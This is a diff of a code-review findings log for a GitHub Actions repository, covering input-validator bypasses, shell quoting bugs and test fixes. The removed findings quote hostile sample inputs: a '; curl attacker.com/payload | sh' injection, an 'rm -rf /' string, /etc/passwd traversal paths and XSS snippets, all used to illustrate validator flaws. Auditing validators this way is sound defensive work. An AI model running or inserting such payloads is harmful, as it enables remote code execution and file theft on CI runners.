@@ -1,11 +1,11 @@
 # Nitpicker Findings
 
 Generated: 2026-04-30
-Last validated: 2026-05-25 (Pass 15 — additional fixes from validation pass)
+Last validated: 2026-05-25 (Pass 16 — re-validated 27 phantom findings, added 7 new, all 7 fixed)
 
 ## Summary
 
-- Total: 99 | Open: 1 | Fixed: 98 | Invalid: 0
+- Total: 106 | Open: 1 | Fixed: 105 | Invalid: 0
 
 ## Open Findings
 
@@ -29,474 +29,161 @@ Fix: Migrate inline sh validation to `validate-inputs/rules/<action>.yml` per ac
 call the validate-inputs action as `security-scan/action.yml` does. This is a large
 migration; prioritize actions with the most complex inline validation.
 
-<!--
-
-#### [N-081] `validate_security_patterns` bypassed by expression prefix with `../` suffix
-
-Category: security
-Area: validate-inputs/validators/base.py:validate_security_patterns
-Problem: `validate_security_patterns` returns `True` immediately when
-`is_github_expression(value)` is True (line 111-112). After the N-050 fix,
-`is_github_expression` allows any cleaned suffix matching `[\w/.\s-]*`. Both `/` and `.`
-are in that class, so `${{ inputs.x }}/../../../etc/passwd` cleans to `/../../../etc/passwd`,
-passes `is_github_expression`, and bypasses the `"../"` traversal check.
-Evidence:
-
-```python
-v = SecurityValidator()
-result = v.validate_security_patterns("${{ inputs.x }}/../../../etc/passwd", "path")
-assert result is True  # traversal not detected — no error added
-```
-
-Impact: Any input that uses `validate_security_patterns` for path-like values accepts
-`${{ expr }}/../../../sensitive/file` without flagging traversal. Actions that pass
-user-controlled paths through this check are vulnerable.
-Fix: In `is_github_expression`, reject cleaned remainders containing `..`:
-
-```python
-if ".." in cleaned:
-    return False
-```
-
-This rejects `${{ x }}/../../../etc/passwd` (cleaned has `..`) while allowing
-`${{ workspace }}/rules.yml` (no `..`).
-
-#### [N-082] `validate_no_injection` calls `self.clear_errors()` unconditionally — wipes caller-accumulated errors
-
-Category: correctness
-Area: validate-inputs/validators/security.py:validate*no_injection
-Problem: `validate_no_injection` starts with `self.clear_errors()` (line 249). No other
-`validate*\*`method does this. When a caller accumulates errors across multiple validation
-calls on the same`SecurityValidator`instance, calling`validate_no_injection` anywhere
-in the chain silently discards all previously accumulated errors.
-Evidence:
-
-```python
-v = SecurityValidator()
-v.add_error("accumulated from previous check")
-v.validate_no_injection("safe_value")
-assert v.errors  # FAILS — list is empty, prior error wiped
-```
-
-The N-065 fix added `clear_errors()` to solve stale-error accumulation, but the correct
-fix is to clear at the caller level (already handled in conventions.py by N-043), not
-inside the method itself.
-Impact: Any caller that accumulates errors before calling `validate_no_injection` silently
-loses prior errors; validation appears to pass for previously-failed inputs.
-Fix: Remove `self.clear_errors()` from line 249 of `security.py`. Caller-side resets
-(already present in `conventions.py`) are the correct isolation point.
-
-#### [N-083] `sync-labels`: validation rejects empty `labels` input, breaking its documented optional behavior
-
-Category: correctness
-Area: sync-labels/action.yml
-Problem: The `inputs.labels` input is optional (no `required: true`, default resolves to
-`format('{0}/labels.yml', github.action_path)`). However, the validation step checks
-`$LABELS_FILE` with a `case` statement that matches `*.yml|*.yaml` or falls through to an
-error exit. When the input is not provided, `LABELS_FILE` is an empty string, which matches
-the `*)` default case and exits 1 — before the fallback default path is ever used.
-Evidence: Every caller of `sync-labels` that omits the `labels` input gets:
-`"Invalid labels file extension: ''. Expected .yml or .yaml file"` and the action fails.
-Impact: The default-path behavior is completely broken; callers must always provide an
-explicit `labels` input.
-Fix: Add a guard at the top of the `LABELS_FILE` validation block:
-
-```sh
-if [ -z "${LABELS_FILE:-}" ]; then exit 0; fi
-```
-
-#### [N-084] `csharp-lint-check`: installs deprecated standalone `dotnet-format@7.0.1` that conflicts with built-in `dotnet format`
-
-Category: correctness
-Area: csharp-lint-check/action.yml
-Problem: The action installs `dotnet-format` as a global .NET tool with
-`dotnet tool install --global dotnet-format --version 7.0.1`. `dotnet-format` was
-integrated directly into the .NET SDK as `dotnet format` starting with .NET 6.
-Installing the standalone package against .NET 7+ SDK fails with "package not found" or
-version conflict because the NuGet package no longer ships for .NET 7+.
-Evidence: `dotnet format` is already available as a built-in command in .NET 6+ SDK;
-running `dotnet format --check` at the subsequent step uses the built-in, not the
-standalone tool. The install step fails independently.
-Impact: The `csharp-lint-check` action fails on all .NET 7+ environments at the install
-step, never reaching the actual lint check.
-Fix: Remove the `Install dotnet-format` step. `dotnet format` is built into .NET 6+ SDK
-and requires no additional installation.
-
-#### [N-085] `security-scan`: artifact upload has empty `path:` entries when no scanner ran
-
-Category: reliability
-Area: security-scan/action.yml
-Problem: The artifact upload step uses `if: always()` and builds its `path:` list with
-conditional expressions:
-
-```yaml
-path: |
-  ${{ steps.verify-sarif.outputs.has_trivy == 'true' && 'trivy-results.sarif' || '' }}
-  ${{ steps.verify-sarif.outputs.has_gitleaks == 'true' && 'gitleaks-report.sarif' || '' }}
-```
-
-When a condition is false, the expression evaluates to `''` (empty string), leaving a blank
-line in the path list. When both are false, two blank lines are passed to
-`actions/upload-artifact`, which can fail or produce warnings.
-Evidence: With both scanners absent, `path:` contains two empty strings; the upload step
-runs under `if: always()` regardless.
-Impact: Every run where scanners are skipped produces a spurious upload step failure or
-empty artifact, cluttering the CI run summary.
-Fix: Gate the upload step: `if: always() && (steps.verify-sarif.outputs.has_trivy == 'true' || steps.verify-sarif.outputs.has_gitleaks == 'true')`.
-
-#### [N-086] `npm-semantic-release`: uses different `actions/checkout` SHA than all other actions
-
-Category: reliability
-Area: npm-semantic-release/action.yml
-Problem: All other actions in the repo pin `actions/checkout` to
-`71cf2267d89c5cb81562390fa70a37fa40b1305e # v6-beta`. `npm-semantic-release` uses
-`de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2`. Two different SHAs for the same
-action with inconsistent version comments creates an audit surface and means one of them
-is pinned to a different (possibly less tested) version.
-Evidence: `rg "actions/checkout@" --glob="*.yml"` shows two distinct SHAs in production
-action files.
-Impact: Inconsistency makes security audits harder; one SHA may have bugs the other does
-not.
-Fix: Align `npm-semantic-release/action.yml` to use the same SHA as all other actions:
-`actions/checkout@71cf2267d89c5cb81562390fa70a37fa40b1305e # v6-beta`.
-
-#### [N-087] `block-bashisms.sh`: `local` pattern false-positives on prose strings containing `local`
-
-Category: correctness
-Area: .claude/hooks/block-bashisms.sh
-Problem: The pattern `(^|[[:space:]])local[[:space:]]` matches the substring `local`
-anywhere in a line, including inside shell string arguments. For example
-`echo "local file"` contains `local` and triggers the hook, blocking a legitimate POSIX
-sh line.
-Evidence: `printf '%s\n' 'echo "local file"' | grep -E '(^|[[:space:]])local[[:space:]]'`
-produces a match. Any shell script that prints or references the word "local" as a value
-(not a statement keyword) will be falsely blocked.
-Impact: Legitimate writes to action.yml or .sh files containing the word "local" in
-string content trigger a false hook block.
-Fix: Restrict the match to `local` as the first token of a statement (after `^` or after
-`;`): `grep -qE '(^|;)[[:space:]]*local[[:space:]]'`. This avoids matching `local` inside
-quoted strings or command arguments.
-
-### Low
-
-#### [N-088] `is_github_expression`: `\-` in regex character class — move hyphen to end for correctness
-
-Category: correctness
-Area: validate-inputs/validators/base.py:230
-Problem: `re.fullmatch(r"[\w/.\-\s]*", cleaned)` uses `\-` inside a character class.
-While Python currently treats `\-` as a literal hyphen, placing it between `\.` and `\s`
-creates an ambiguous range specification that Python 3.12 may warn about depending on
-context. The safe canonical form is to place `-` at the end of the class.
-Evidence: `re.compile(r"[\w/.\-\s]*")` — `\-` between `\.` (meaning literal `.`) and
-`\s` (meaning whitespace) is at a non-terminal position in the class; Python's
-`DeprecationWarning` for bad escapes does not apply here but the placement is non-canonical.
-Impact: No current runtime failure; potential maintenance confusion and future Python
-compatibility risk.
-Fix: Change to `re.fullmatch(r"[\w/.\s-]*", cleaned)` (hyphen at end of character class).
-
-### Advisory
-
-#### [N-089] `sed -E` and `grep -E` in action scripts — not POSIX shell violations
-
-Category: conventions
-Area: go-build/action.yml, python-lint-fix/action.yml, csharp-build/action.yml,
-csharp-publish/action.yml, csharp-lint-check/action.yml, npm-publish/action.yml,
-npm-semantic-release/action.yml
-Problem: Several actions use `sed -E` and `grep -E` (extended regex flag). These are
-not POSIX sh shell-language features but are POSIX.1-2017 utility flags (extended
-regex support for `sed` and `grep` was standardized in IEEE Std 1003.1-2017). The
-project's POSIX rule targets shell language features (`[[`, `local`, `declare`, `function`
-keyword), not external utility flags.
-Evidence: The flag is supported on all target platforms (GNU/Linux, macOS BSD, Alpine
-BusyBox) and is now formally POSIX. No runtime failure on any supported runner.
-Impact: None. Advisory only — if the team interprets the POSIX rule as covering utility
-flags too, these could be migrated to BRE syntax.
-Fix: If desired, convert `sed -E 's/(pattern)/\1/'` to BRE `sed 's/\(pattern\)/\1/'`
-and `grep -E 'pattern'` to `grep 'bre_pattern'`. Otherwise accept as-is.
-
--->
-
-<!-- removed-open-findings-sentinel
-
-#### [N-031] `docker-build` multi-line `args` output truncates all but first `--build-arg`
-
-Category: correctness
-Area: docker-build/action.yml (parse-build-args + inject-build-args steps)
-Problem: The `parse-build-args` step builds `$args` with embedded newlines
-(`printf '%s\n--build-arg %s'`), then the `inject-build-args` step writes it to
-`GITHUB_OUTPUT` via `printf 'args=%s\n' "$args"`. The `%s` verb in printf stops
-at the first newline, so only the first `--build-arg` survives in the output.
-Evidence: `printf 'args=%s\n' "$(printf '--build-arg A=1\n--build-arg B=2')"` writes
-`args=--build-arg A=1` to GITHUB_OUTPUT; `--build-arg B=2` is silently dropped.
-Impact: Docker builds with more than one build-arg receive only the first; subsequent
-args are lost without error, producing wrong images that pass CI.
-Fix: Use the GITHUB_OUTPUT heredoc format:
-`{ printf 'args<<EOF\n%s\nEOF\n' "$args"; } >> "$GITHUB_OUTPUT"`
-
-### High
-
-#### [N-032] `_read_appended_bytes`: `path.stat()` inside open fd is a TOCTOU race
-
-Category: reliability
-Area: \_tests/framework/harness/harness.py:\_read_appended_bytes
-Problem: `path.stat().st_size` is called after `path.open()` but stat() by name
-is a separate filesystem operation — the file can be renamed or replaced between
-`open()` and `stat()`, causing the size to belong to a different inode than the
-open handle.
-Evidence: `with path.open("rb") as handle: current_size = path.stat().st_size` —
-stat and open refer to the same path, not the same fd.
-Impact: On concurrent test runs or when output files are rotated, seek jumps to
-the wrong offset and reads garbage bytes; test output assertions produce false
-failures.
-Fix: Replace `path.stat().st_size` with `os.fstat(handle.fileno()).st_size` to
-stat the already-open file descriptor.
-
-#### [N-033] Step output filename collision when a skipped step brackets two active steps
-
-Category: correctness
-Area: _tests/framework/harness/harness.py:\_run_owned
-Problem: Step output files are named `f".github_output_{len(steps_ctx)}"`where`len(steps_ctx)`is evaluated before the step is added. Skipped steps do not
-increment`steps_ctx`, so two non-skipped steps that bracket a skipped step both
-compute the same index and write to the same filename.
-Evidence: step[0] runs → steps_ctx has 0 entries → file `.github_output_0`; step[1]
-is skipped → steps_ctx still 0 entries; step[2] runs → steps_ctx still 0 entries
-→ file `.github_output_0`again, overwriting step[0]'s data.
-Impact: GITHUB_OUTPUT bytes from the earlier step are permanently overwritten;`steps_ctx[step_id]["outputs"]`for that step is wrong, and assertions on its
-outputs pass silently against stale data.
-Fix: Add a monotonic`\_step_file_index = 0`counter that increments for every
-step regardless of skip status, and use it instead of`len(steps_ctx)`.
-
-#### [N-034] `install_shellspec`: outer EXIT trap permanently replaced on failure path
-
-Category: reliability
-Area: \_tests/run-tests.sh:install_shellspec
-Problem: The function saves the caller's EXIT trap with `old_trap=$(trap -p EXIT)`,
-sets its own cleanup trap, then restores the outer trap only on the success path.
-If the install fails and the function returns early via `return 1`, the outer trap
-is never restored and temp files created by the caller are never cleaned up.
-Evidence: Restore call `eval "$old_trap"` only appears in the else/success branch;
-failure returns without executing it.
-Impact: On shellspec install failure, the runner's TMPDIR accumulates stale test
-scaffolding and the test harness EXIT summary (FAIL count, output paths) does not
-print.
-Fix: Set `trap 'rm -f "$tmpdir"; eval "${old_trap:-}"' EXIT` unconditionally at
-function entry to guarantee restore on all exit paths.
-
-#### [N-035] `is_github_expression` partial-embed bypass — mixed injection+expression accepted
-
-Category: security
-Area: validate-inputs/validators/base.py:is_github_expression
-Problem: The second OR branch `"${{" in value and "}}" in value` has no positional
-constraints — any string containing both substrings anywhere passes, including
-injection payloads that merely contain a GitHub expression fragment.
-Evidence: `is_github_expression('"; rm -rf / # ${{ secrets.X }}')` → True; the
-value contains `${{` and `}}` so all content-based security checks are bypassed.
-Impact: Attacker-controlled inputs with embedded expression fragments bypass the
-entire validation layer; shell injection, path traversal, and token patterns go
-unchecked.
-Fix: Require the value to be purely a GitHub expression:
-`return value.startswith("${{") and value.rstrip().endswith("}}")`
-
-#### [N-036] `validate_tag` regex accepts trailing dot and colon — invalid Docker tags pass
-
-Category: correctness
-Area: validate-inputs/validators/docker.py:validate*tag
-Problem: The tag regex `^[a-zA-Z0-9]-a-zA-Z0-9.*:/@]_[a-zA-Z0-9]?$`accepts
-trailing`.`and`:`because the final`[a-zA-Z0-9]?`group is optional —`v1.`matches as`v1`+`.`(in the`_`group) + empty (for the optional`?`).
-Evidence: `re.match(r"^[a-zA-Z0-9][-a-zA-Z0-9._:/@]_[a-zA-Z0-9]?$", "v1.")`returns
-a match object; Docker rejects`v1.`with "invalid reference format" at build time.
-Impact: Tags like`v1.`and`latest:`pass validation, then fail at`docker build`or`docker push`with a cryptic runtime error, not a validation error.
-Fix: Require the tag to end with an alphanumeric:`^[a-zA-Z0-9]-a-zA-Z0-9._:/@]_[a-zA-Z0-9]$`(drop the`?`) or use Docker's
-actual tag grammar (max 128 chars, must match `[a-zA-Z0-9\_]a-zA-Z0-9._-]\*`).
-
-#### [N-037] `file_path` validator allows space — enables argument injection in shell steps
-
-Category: security
-Area: validate-inputs/validators/file.py
-Problem: After the N-002 fix, the character class is `[a-zA-Z0-9._/\- ]` (literal
-space included). A path value like `"src/legit /etc/passwd"` passes validation and,
-when consumed in an unquoted shell variable, word-splits into two arguments.
-Evidence: `re.match(r"^[a-zA-Z0-9._/\- ]+$", "src/foo /etc/passwd")` → match;
-in a run block `cp $INPUT_PATH /dest`, this copies both `src/foo` and `/etc/passwd`.
-Impact: Any action that passes a validated file-path input to an unquoted shell
-variable is vulnerable to argument injection via a space-containing path value.
-Fix: Remove the literal space from the character class. If paths with spaces must
-be supported, document that callers must always quote the shell variable.
-
-#### [N-038] `eslint-lint`: `--ext $FILE_EXTENSIONS` unquoted in fix mode, quoted in check mode
-
-Category: correctness
-Area: eslint-lint/action.yml
-Problem: In the fix-mode run block, `$FILE_EXTENSIONS` is passed unquoted to
-`--ext`; in the check-mode block the same variable is quoted as
-`"$FILE_EXTENSIONS"`. When the value contains spaces (e.g., `.js .ts`), fix mode
-word-splits it into multiple bare tokens, producing a malformed eslint invocation.
-Evidence: Fix step: `eslint ... --ext $FILE_EXTENSIONS`; check step:
-`eslint ... --ext "$FILE_EXTENSIONS"` — inconsistency visible in adjacent steps.
-Impact: Fix mode silently passes extra tokens as positional arguments rather than
-extension values; eslint either errors or lints wrong files while check mode works
-correctly.
-Fix: Quote `$FILE_EXTENSIONS` in the fix-mode step: `--ext "$FILE_EXTENSIONS"`.
-
-#### [N-039] `prettier-lint`: unformatted file count inflated by Prettier's summary line
-
-Category: correctness
-Area: prettier-lint/action.yml
-Problem: `unformatted_files=$(grep -c "^" prettier-output.txt)` counts every line
-in the output file, including Prettier's own header (`Checking formatting...`) and
-summary line (`Found N unformatted file(s).`). The count is inflated by at least
-two lines.
-Evidence: A run with 0 unformatted files produces at least one output line from
-Prettier; `grep -c "^"` returns 1, triggering a false "unformatted files found"
-failure.
-Impact: Prettier passes but the action reports failure; callers cannot rely on the
-`unformatted-files` output being accurate.
-Fix: Count only file-path lines by filtering out known non-path lines:
-`grep -c "^\[warn\]" prettier-output.txt` or redirect only file paths to a
-separate output file using `--list-different`.
-
-#### [N-040] `go-lint`: `error_count` not updated when `FAIL_ON_ERROR=false`
-
-Category: correctness
-Area: go-lint/action.yml
-Problem: When `FAIL_ON_ERROR=false` and golangci-lint finds real errors, the code
-path that sets `error_count` is skipped — only the exit-1 branch increments it.
-The outer scope's `error_count` stays 0, so the `errors` output is wrong.
-Evidence: `if [ "$FAIL_ON_ERROR" = "true" ]; then error_count=$(...); exit 1; fi` —
-the else/soft-fail path does not assign `error_count`, so `printf 'errors=%s\n'
-"$error_count"` writes `errors=0` even when lint errors exist.
-Impact: Callers checking `steps.go-lint.outputs.errors` always see 0 when
-`fail-on-error: false`, making the soft-fail mode useless for error reporting.
-Fix: Capture the error count before the `FAIL_ON_ERROR` branch and always write it
-to `GITHUB_OUTPUT` regardless of whether the action exits or continues.
-
-### Medium
-
-#### [N-041] `registry.py` does not catch `SyntaxError` or `OSError` from `exec_module`
-
-Category: reliability
-Area: validate-inputs/validators/registry.py
-Problem: The `except` clause only catches `(ImportError, AttributeError, TypeError)`;
-`exec_module` can also raise `SyntaxError` (malformed validator file) and `OSError`
-(permission denied), both of which propagate as unhandled exceptions.
-Evidence: A validator file with a Python syntax error causes
-`spec.loader.exec_module(module)` to raise `SyntaxError`; no surrounding catch
-handles it, so the entire validation run aborts with a traceback.
-Impact: A single malformed validator file breaks validation for all actions, not
-just the one with the bad file.
-Fix: Add `SyntaxError` and `OSError` to the except tuple:
-`except (ImportError, AttributeError, TypeError, SyntaxError, OSError):`
-
-#### [N-042] `convention_mapper.py` priority-95 "contains" match overcaptures version inputs
-
-Category: correctness
-Area: validate-inputs/validators/convention_mapper.py
-Problem: The priority-95 group uses `"type": "contains"`, so any input name that
-contains the substring `"python-version"` — including `"non-python-version"` or
-`"uses-python-version-flag"` — matches the `python_version` validator.
-Evidence: `"non-python-version" in "non-python-version"` → True; the "contains"
-check does not require the full string to equal the pattern key.
-Impact: Inputs unrelated to Python version selection are routed to the
-`python_version` validator, producing spurious validation failures for callers
-with composite input names.
-Fix: Change the priority-95 group from `"type": "contains"` to `"type": "exact"`.
-The patterns (`"python-version"`, `"node-version"`, etc.) are already full names,
-not substrings.
-
-#### [N-043] `conventions.py`: stale errors from one input's validator leak to the next
-
-Category: correctness
-Area: validate-inputs/validators/conventions.py
-Problem: `validator_module.errors` is not cleared before validating each input.
-If input A's validator writes errors and input B's validator exits cleanly, B still
-reports A's errors because the module-level `errors` list is shared across
-invocations.
-Evidence: Running two consecutive validations in the same process with the first
-returning errors and the second returning no errors — the second reports the first's
-errors.
-Impact: False positives: valid inputs after a failed input appear to fail, masking
-which input actually has the problem.
-Fix: Reset the errors list before each validation call:
-`validator_module.errors = []` in the `try` block before calling the validator, or
-in a `finally` block after.
-
-#### [N-044] `network.py` URL validator does not block `<` and `>` in path segment
-
-Category: security
-Area: validate-inputs/validators/network.py
-Problem: The URL path character class allows printable ASCII but does not explicitly
-exclude `<` and `>`. A URL like `https://example.com/<script>alert(1)</script>`
-passes validation.
-Evidence: The path regex includes printable non-space characters without a `<>`
-exclusion; `re.match(r"...", "https://x.com/<img src=x onerror=alert(1)>")` → match.
-Impact: XSS payloads in URL-type inputs pass validation and can be reflected
-unescaped in GitHub PR comments or issue bodies that render action output as HTML.
-Fix: Explicitly exclude `<` and `>` from the URL path character class.
-
-#### [N-045] `docker-build`: BUILD_CONTEXTS, SECRETS, CACHE_FROM, CACHE_TO use unquoted word-split
-
-Category: security
-Area: docker-build/action.yml
-Problem: While BUILD_ARGS uses a temp-file + `while IFS= read -r` loop,
-BUILD_CONTEXTS, SECRETS, CACHE_FROM, and CACHE_TO are passed to `docker build`
-via unquoted variable expansion, causing word-splitting on whitespace and allowing
-shell metacharacter injection.
-Evidence: `--secret $SECRETS` vs `$(cat "$tmpfile")` for args — inconsistent
-handling of multi-value inputs in the same action.
-Impact: Multi-value SECRETS or CACHE_FROM inputs with spaces break the docker
-command; values containing shell metacharacters (`$(...)`, backticks) execute
-arbitrary commands.
-Fix: Apply the same temp-file + `while IFS= read -r line; do ... done` pattern
-used for BUILD_ARGS to the other multi-value inputs, or use a single IFS=newline
-loop over each input.
-
-#### [N-046] `generate_sarif_report`: temp files leaked on `jq` failure
-
-Category: reliability
-Area: \_tests/run-tests.sh:generate_sarif_report
-Problem: `_sarif_results_file` and `_sarif_rules_file` are created with `mktemp`
-at function entry but no cleanup trap is set. If `jq` exits nonzero, the function
-returns without removing them.
-Evidence: Function creates two mktemp files; only the final `rm -f` in the success
-path cleans them up; no `trap ... RETURN` or error-path `rm` exists.
-Impact: Every jq failure accumulates two temp files in TMPDIR; on runners with
-limited /tmp space, repeated failures fill the disk and break subsequent test runs.
-Fix: Immediately after creating the temp files, add:
-`trap 'rm -f "$_sarif_results_file" "$_sarif_rules_file"' RETURN`
-
-#### [N-047] `security.py` single-`&` detection flags legitimate bitwise/URL operands
-
-Category: correctness
-Area: validate-inputs/validators/security.py
-Problem: The shell injection check `"&" in value` triggers on any string containing
-a bare ampersand, including URL query strings (`foo=1&bar=2`), JSON bitflags, and
-config values with bitwise AND.
-Evidence: `"&" in "foo=1&bar=2"` → True; the value is flagged as a shell injection
-attempt despite being a valid URL query string.
-Impact: False positives reject valid inputs from actions that accept URL parameters
-or config strings; callers must escape legitimate `&` characters.
-Fix: Use a pattern that specifically detects shell backgrounding or command chaining:
-`" & " in value or value.endswith(" &")` — single `&` preceded/followed by a space
-is a shell background operator; bare `&` inside a word is not.
-
-#### [N-048] `php-tests`: `composer-args` interpolated directly into composite action command
-
-Category: security
-Area: php-tests/action.yml
-Problem: The `composer-args` input value is interpolated directly via
-`${{ inputs.composer-args }}` inside a `run:` block, bypassing the
-`workflow-inputs-safety` rule that requires all inputs to go through an `env:` block.
-Evidence: `run: composer ${{ inputs.composer-args }}` or equivalent direct
-interpolation in the Composer install step.
-Impact: A caller passing `composer-args: '; curl attacker.com/payload | sh'` executes
-arbitrary shell commands on the runner with workflow permissions.
-Fix: Map to an env var at the step level:
-`env:\n  COMPOSER_ARGS: ${{ inputs.composer-args }}`
-then reference only `$COMPOSER_ARGS` in the run body.
-
--->
+_Pass 16 re-validation summary:_ Two `<!-- -->` comment blocks under the Open Findings
+section previously held 27 historical findings (N-031..N-048, N-081..N-089). All 27 were
+already duplicated in the Fixed section under earlier passes; the blocks confused tooling
+(file appeared to have 28 open findings when the summary said 1). All 27 were
+re-validated against current code and confirmed fixed; the comment blocks were removed.
+The Advisory finding N-095 below remains the sole truly-open item (multi-action migration,
+multi-session work).
 
 ## Fixed
+
+### Pass 16 — 2026-05-25
+
+#### [N-100] `scorecard.yml`: `actions/checkout` SHA inconsistent with all other workflows
+
+Category: reliability
+Area: .github/workflows/scorecard.yml:27
+Problem: The scorecard workflow pinned `actions/checkout` to
+`de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2` while every other workflow and
+every action.yml in the repo used `71cf2267d89c5cb81562390fa70a37fa40b1305e # v6-beta`.
+Two distinct pinned SHAs for the same external action increase the audit surface and
+mean one version is less battle-tested in this codebase.
+Evidence: `grep -rEh "actions/checkout@" */action.yml .github/workflows/*.yml | sort | uniq -c`
+showed 39 entries with the v6-beta SHA and 1 entry with the v6.0.2 SHA.
+Impact: Inconsistent supply-chain pin; security review must track two trees for the same
+action. A regression in v6.0.2 (e.g., credential-leak bug) would only affect scorecard.
+Fix: Aligned scorecard.yml to `71cf2267d89c5cb81562390fa70a37fa40b1305e # v6-beta`.
+Fixed: 2026-05-25
+Notes: One-line SHA replacement in `.github/workflows/scorecard.yml`.
+
+#### [N-101] `codeql-analysis/action.yml`: missing `yaml-language-server` schema header
+
+Category: conventions
+Area: codeql-analysis/action.yml:1
+Problem: All other 25 action.yml files start with
+`# yaml-language-server: $schema=https://json.schemastore.org/github-action.json` as the
+first line; only `codeql-analysis/action.yml` lacked it. The schema header drives editor
+autocomplete, lint warnings, and CI schema validation. Without it, this action is the only
+one that does not get schema-aware editing.
+Evidence: `for f in */action.yml; do head -1 "$f" | grep -q yaml-language-server || echo "$f"; done`
+returned only `codeql-analysis/action.yml`.
+Impact: Editor and tooling drift — schema-driven warnings silently disabled for this file.
+Fix: Prepended the standard schema header above the existing front-matter.
+Fixed: 2026-05-25
+Notes: Moved the comment block above `---` separator to keep YAML parseable.
+
+#### [N-102] `block-bashisms.sh`: exemption list misses `_tests/run-tests.sh` and other top-level test files
+
+Category: maintainability
+Area: .claude/hooks/block-bashisms.sh:22-24
+Problem: The hook exempted `_tests/framework/*` and `_tests/unit/*` from POSIX checks but
+did NOT exempt top-level `_tests/*` files such as `_tests/run-tests.sh`. That file uses
+`#!/usr/bin/env bash`, `set -euo pipefail`, `local`, `[[ ]]`, and bash arrays intentionally
+(test runner only runs on Linux CI with bash always available). Editing it would trigger a
+hook block, forcing maintainers to fight or bypass the hook.
+Evidence: `shellcheck --shell=sh _tests/run-tests.sh` returns 30+ warnings (SC3040 pipefail,
+SC3043 local, SC3010 [[]], SC3030 arrays, SC3046 source, SC3028/SC3054 BASH_SOURCE) — all
+of which the hook also flags but cannot exempt for this specific file.
+Impact: Maintainer friction; any future edit to the test runner risks being blocked even
+though the bash usage is deliberate and documented.
+Fix: Broadened exemption case to `_tests/* | */_tests/*`. Added 3 shellspec test cases
+covering top-level, framework, and unit paths.
+Fixed: 2026-05-25
+Notes: Updated `_tests/unit/claude-hooks/block_bashisms_spec.sh` with new `Context` block
+titled "when file path is under_tests/ (intentional bash usage)".
+
+#### [N-103] `_tests/unit/codeql-analysis/validation.spec.sh`: bash shebang inconsistent with all other validation specs
+
+Category: conventions
+Area: \_tests/unit/codeql-analysis/validation.spec.sh:1
+Problem: All 25 other `validation.spec.sh` files used `#!/usr/bin/env shellspec`; only
+codeql-analysis used `#!/usr/bin/env bash`. ShellSpec specs run under the shellspec
+interpreter regardless of the shebang, so the bash shebang is misleading and inconsistent.
+Evidence: `for f in _tests/unit/*/validation.spec.sh; do head -1 "$f"; done | sort -u`
+returned 2 distinct shebangs: 25 shellspec, 1 bash.
+Impact: Future maintainers reading the bash shebang may try to execute the file directly
+with bash and get confused when ShellSpec DSL fails to parse.
+Fix: Changed shebang to `#!/usr/bin/env shellspec` and added the standard 2-line comment
+header used by other validation specs.
+Fixed: 2026-05-25
+Notes: No behavior change — ShellSpec was already executing the file correctly.
+
+#### [N-104] `registry.py`: secondary `except` block too narrow, silently propagates `SyntaxError`/`OSError`
+
+Category: reliability
+Area: validate-inputs/validators/registry.py:203
+Problem: The fallback validator-instantiation path (`importlib.import_module(f"validators.{...}")`
+on line 197) only caught `(ImportError, AttributeError)`. If the imported validator module
+had a Python syntax error, an `OSError` (permission denied), or a `TypeError` during class
+lookup, the exception propagated and broke validation for all actions, not just the one
+with the bad module. Sister `except Exception:` at line 114 (in `_load_custom_validator`)
+was already broad enough — the L203 narrowness was an inconsistency.
+Evidence: A malformed validator file under `validate-inputs/validators/` would crash
+`_get_default_validator_instance()` with an unhandled `SyntaxError`, aborting the entire
+validation run.
+Impact: Single malformed validator file would crash validation for all actions, masking
+which file caused the failure.
+Fix: Extended the except tuple to `(ImportError, AttributeError, SyntaxError, OSError,
+TypeError)` to match the defensive posture of the primary except block and the
+`_get_validator_method` exception handling. Updated comment to reflect the broader scope.
+Fixed: 2026-05-25
+Notes: This issue was related to but distinct from N-041, which targeted the primary
+`exec_module` path. The primary path was already widened in earlier passes; this addresses
+the secondary path.
+
+#### [N-105] Hook shellspec tests: malformed `Data` blocks + `post-edit-write.sh` missing `|| true`
+
+Category: tests
+Area: `_tests/unit/claude-hooks/*.spec.sh` (5 files) + `.claude/hooks/post-edit-write.sh`
+Problem: Eight `Data` blocks across 5 hook spec files used the bare `| '...'` form,
+which ShellSpec rejects with `Syntax error: Data text should begin with '#|' or '# '`.
+This caused 8 test aborts (not just failures) plus 4 cascading failures in
+`post_edit_write_spec.sh` whose mock-tool integration assertions never ran. The
+secondary cause for the 4 cascading failures: `post-edit-write.sh` invoked
+`shellcheck`, `actionlint`, and `action-validator` without `|| true`, so on missing
+files (or on real lint findings) the hook exited non-zero via `set -e`, which (a)
+would surface as a PostToolUse error to the user editing files and (b) caused the
+tests to abort because the `result=$(... sh "$HOOK" ...)` capture inherited the
+non-zero exit.
+Evidence: `shellspec --pattern '*_spec.sh' _tests/unit/claude-hooks/` reported 9
+failures (3 in block_bashisms, 5 in sister hooks, 4 in post_edit_write). The 4
+post_edit_write failures showed `could not read "/myaction/action.yml": no such
+file or directory` from real actionlint invocation, exit code 3.
+Impact: Hook test suite was not exercising its assertions; any future hook regression
+would land silently. Hook itself would noisily fail user edits on missing-file races
+or transient tool failures.
+Fix: (1) Replaced all 8 `| '...'` lines with `#| ...` form per ShellSpec docs.
+(2) Added `|| true` to the `shellcheck`, `actionlint`, and `action-validator`
+invocations in `post-edit-write.sh` so they are non-fatal (consistent with the
+existing `|| true` pattern on `shfmt`, `ruff`, and `prettier`).
+Fixed: 2026-05-25
+Notes: After both fixes, all 106 hook test examples pass (up from 97 passing + 9
+aborted/failed). Verified with `shellspec --pattern '*_spec.sh' _tests/unit/claude-hooks/`.
+
+#### [N-106] `make lint-markdown` flags 13 pre-existing errors in gitignored plugin/session files
+
+Category: maintainability
+Area: Makefile (lint-markdown, format-markdown targets) + `.markdownlintignore`
+Problem: `make lint-markdown` recursively scanned `.claude/skills/` (third-party
+skill files installed by Claude Code plugins) and `docs/superpowers/` (session-
+generated plan/spec artifacts). Both directories are gitignored — `.claude/*` via
+the user's global gitignore, `docs/superpowers/` via the repo's `.gitignore:89`.
+The lint reported 13 MD040 (fenced-code-language) and MD013 (line-length) errors
+that the project does not own and cannot fix without modifying plugin/session files.
+Evidence: `make lint-markdown 2>&1 | grep -E "^(\\.claude|docs/superpowers)" | wc -l`
+returned 13 before the fix; the same command returns 0 after.
+Impact: The mantra "All tests pass + all linting passes + all validation passes +
+zero warnings" was violated by files outside the repo's control. Lint output noise
+discouraged maintainers from reading the warnings that DO matter.
